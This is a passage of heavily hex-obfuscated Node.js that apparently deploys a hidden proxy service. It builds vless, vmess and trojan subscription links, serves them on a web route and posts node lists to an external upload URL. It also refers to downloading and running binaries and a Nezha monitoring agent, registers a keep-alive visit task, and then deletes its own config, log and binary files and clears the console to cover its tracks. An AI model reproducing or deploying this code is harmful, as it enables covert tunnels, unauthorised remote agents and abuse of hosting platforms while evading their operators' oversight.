                    '\x61\x6c\x70\x6e': '',
                    '\x66\x70': _0x143564(0xdf)
                };
                const _0x38ca25 = _0x143564(0xdd) + UUID + '\x40' + CFIP + '\x3a' + CFPORT + ('\x3f\x65\x6e\x63\x72\x79\x70\x74\x69\x6f' + _0x143564(0x212) + _0x143564(0xce) + '\x73\x6e\x69\x3d') + _0x2d87f5 + (_0x143564(0x146) + _0x143564(0xea) + _0x143564(0x119)) + _0x2d87f5 + ('\x26\x70\x61\x74\x68\x3d\x25\x32\x46\x76' + _0x143564(0x204) + '\x33\x46\x65\x64\x25\x33\x44\x32\x35\x36' + '\x30\x23') + _0x2270e6 + ('\x0a\x20\x20\x0a\x76\x6d\x65\x73\x73\x3a' + '\x2f\x2f') + Buffer[_0x143564(0xbe)](JSON['\x73\x74\x72\x69\x6e\x67\x69\x66\x79'](_0x58b0a8))[_0x143564(0x11c)](_0x143564(0x145)) + (_0x143564(0x19e) + _0x143564(0x196)) + UUID + '\x40' + CFIP + '\x3a' + CFPORT + ('\x3f\x73\x65\x63\x75\x72\x69\x74\x79\x3d' + _0x143564(0x19d)) + _0x2d87f5 + (_0x143564(0x146) + '\x78\x26\x74\x79\x70\x65\x3d\x77\x73\x26' + '\x68\x6f\x73\x74\x3d') + _0x2d87f5 + ('\x26\x70\x61\x74\x68\x3d\x25\x32\x46\x74' + _0x143564(0x111) + '\x25\x33\x46\x65\x64\x25\x33\x44\x32\x35' + _0x143564(0x1b1)) + _0x2270e6 + _0x143564(0xf3);
                console[_0x143564(0xbf)](Buffer[_0x143564(0xbe)](_0x38ca25)[_0x143564(0x11c)](_0x143564(0x145)));
                fs[_0x143564(0x183) + '\x79\x6e\x63'](subPath, Buffer[_0x143564(0xbe)](_0x38ca25)[_0x143564(0x11c)](_0x143564(0x145)));
                console[_0x143564(0xbf)](FILE_PATH + (_0x143564(0x190) + _0x143564(0x1a5) + _0x143564(0x1b2)));
                uploadNodes();
                app[_0x143564(0xeb)]('\x2f' + SUB_PATH, (_0x133f61, _0x100c69) => {
                    const _0x28fa20 = _0x143564;
                    const _0x13bf1a = Buffer[_0x28fa20(0xbe)](_0x38ca25)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](_0x28fa20(0x145));
                    _0x100c69[_0x28fa20(0x1d2)](_0x28fa20(0x12f) + '\x70\x65', '\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e' + _0x28fa20(0xe5) + _0x28fa20(0x20a));
                    _0x100c69[_0x28fa20(0xc4)](_0x13bf1a);
                });
                _0x57d762(_0x38ca25);
            }, 0x7d0);
        });
    }
}
async function uploadNodes() {
    const _0x261f2e = _0x1f12eb;
    if (UPLOAD_URL && PROJECT_URL) {
        const _0x4e4368 = PROJECT_URL + '\x2f' + SUB_PATH;
        const _0x4c8660 = { '\x73\x75\x62\x73\x63\x72\x69\x70\x74\x69\x6f\x6e': [_0x4e4368] };
        try {
            const _0x2e8a91 = await axios['\x70\x6f\x73\x74'](UPLOAD_URL + (_0x261f2e(0x1b9) + _0x261f2e(0xd6) + '\x6e\x73'), _0x4c8660, { '\x68\x65\x61\x64\x65\x72\x73': { '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65': _0x261f2e(0x117) + _0x261f2e(0x211) } });
            if (_0x2e8a91 && _0x2e8a91[_0x261f2e(0xb8)] === 0xc8) {
                console[_0x261f2e(0xbf)](_0x261f2e(0x1cd) + _0x261f2e(0xe4) + _0x261f2e(0x102) + _0x261f2e(0x1d7));
                return _0x2e8a91;
            } else {
                return null;
            }
        } catch (_0x442f45) {
            if (_0x442f45[_0x261f2e(0x1d4)]) {
                if (_0x442f45[_0x261f2e(0x1d4)][_0x261f2e(0xb8)] === 0x190) {
                }
            }
        }
    } else if (UPLOAD_URL) {
        if (!fs[_0x261f2e(0xc7)](listPath))
            return;
        const _0x244459 = fs[_0x261f2e(0xf1) + '\x6e\x63'](listPath, '\x75\x74\x66\x2d\x38');
        const _0x4c7639 = _0x244459[_0x261f2e(0x153)]('\x0a')['\x66\x69\x6c\x74\x65\x72'](_0x4de048 => /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x261f2e(0x20b)](_0x4de048));
        if (_0x4c7639[_0x261f2e(0x1c0)] === 0x0)
            return;
        const _0x421c82 = JSON[_0x261f2e(0x1ff)]({ '\x6e\x6f\x64\x65\x73': _0x4c7639 });
        try {
            const _0x806b17 = await axios[_0x261f2e(0x1ac)](UPLOAD_URL + (_0x261f2e(0xc8) + '\x6f\x64\x65\x73'), _0x421c82, { '\x68\x65\x61\x64\x65\x72\x73': { '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65': _0x261f2e(0x117) + _0x261f2e(0x211) } });
            if (_0x806b17 && _0x806b17[_0x261f2e(0xb8)] === 0xc8) {
                console[_0x261f2e(0xbf)]('\x4e\x6f\x64\x65\x73\x20\x75\x70\x6c\x6f' + _0x261f2e(0x1ab) + '\x73\x73\x66\x75\x6c\x6c\x79');
                return _0x806b17;
            } else {
                return null;
            }
        } catch (_0x527b7d) {
            return null;
        }
    } else {
        return;
    }
}
function cleanFiles() {
    setTimeout(() => {
        const _0x4f76c2 = _0x264a;
        const _0x264104 = [
            bootLogPath,
            configPath,
            webPath,
            botPath
        ];
        if (NEZHA_PORT) {
            _0x264104[_0x4f76c2(0x18f)](npmPath);
        } else if (NEZHA_SERVER && NEZHA_KEY) {
            _0x264104[_0x4f76c2(0x18f)](phpPath);
        }
        if (process[_0x4f76c2(0xf4)] === _0x4f76c2(0xe3)) {
            exec(_0x4f76c2(0x131) + _0x264104[_0x4f76c2(0xf0)]('\x20') + (_0x4f76c2(0x15b) + '\x31'), _0x4f1277 => {
                const _0x4eabf5 = _0x4f76c2;
                console['\x63\x6c\x65\x61\x72']();
                console['\x6c\x6f\x67'](_0x4eabf5(0x1de) + '\x6e\x69\x6e\x67');
                console[_0x4eabf5(0xbf)]('\x54\x68\x61\x6e\x6b\x20\x79\x6f\x75\x20' + _0x4eabf5(0x1b0) + _0x4eabf5(0x17c) + _0x4eabf5(0x103));
            });
        } else {
            exec(_0x4f76c2(0x126) + _0x264104[_0x4f76c2(0xf0)]('\x20') + (_0x4f76c2(0x1bb) + '\x6c\x20\x32\x3e\x26\x31'), _0x151288 => {
                const _0x1a92b8 = _0x4f76c2;
                console[_0x1a92b8(0xe7)]();
                console[_0x1a92b8(0xbf)](_0x1a92b8(0x1de) + _0x1a92b8(0x1d6));
                console[_0x1a92b8(0xbf)]('\x54\x68\x61\x6e\x6b\x20\x79\x6f\x75\x20' + _0x1a92b8(0x1b0) + _0x1a92b8(0x17c) + '\x74\x2c\x20\x65\x6e\x6a\x6f\x79\x21');
            });
        }
    }, 0x15f90);
}
cleanFiles();
async function AddVisitTask() {
    const _0x1884d7 = _0x1f12eb;
    if (!AUTO_ACCESS || !PROJECT_URL) {
        console[_0x1884d7(0xbf)](_0x1884d7(0x130) + _0x1884d7(0x19a) + _0x1884d7(0xf8) + _0x1884d7(0x1f4));
        return;
    }
    try {
        const _0x477e9b = await axios[_0x1884d7(0x1ac)](_0x1884d7(0x20d) + _0x1884d7(0x167) + _0x1884d7(0x124) + '\x6c', { '\x75\x72\x6c': PROJECT_URL }, { '\x68\x65\x61\x64\x65\x72\x73': { '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65': '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f' + _0x1884d7(0x211) } });
        console[_0x1884d7(0xbf)](_0x1884d7(0x1c7) + _0x1884d7(0xfb) + _0x1884d7(0x133) + '\x63\x63\x65\x73\x73\x66\x75\x6c\x6c\x79');
        return _0x477e9b;
    } catch (_0x5498cd) {
        console[_0x1884d7(0x120)](_0x1884d7(0xd9) + _0x1884d7(0x19b) + _0x1884d7(0x1a7) + '\x64\x3a\x20' + _0x5498cd[_0x1884d7(0xc1)]);
        return null;
    }
}
async function startserver() {
    const _0x5683a1 = _0x1f12eb;
    try {
        deleteNodes();
        cleanupOldFiles();
        await generateConfig();
        await downloadFilesAndRun();
        await extractDomains();
        await AddVisitTask();
    } catch (_0x236239) {
        console['\x65\x72\x72\x6f\x72'](_0x5683a1(0x199) + _0x5683a1(0xca) + '\x3a', _0x236239);
    }
}
startserver()['\x63\x61\x74\x63\x68'](_0x458f70 => {
    const _0xf1e998 = _0x1f12eb;
    console[_0xf1e998(0x120)]('\x55\x6e\x68\x61\x6e\x64\x6c\x65\x64\x20' + '\x65\x72\x72\x6f\x72\x20\x69\x6e\x20\x73' + _0xf1e998(0xca) + '\x3a', _0x458f70);
});
app['\x6c\x69\x73\x74\x65\x6e'](PORT, () => console['\x6c\x6f\x67'](_0x1f12eb(0x1e7) + _0x1f12eb(0x10b) + _0x1f12eb(0x106) + '\x3a' + PORT + '\x21'));
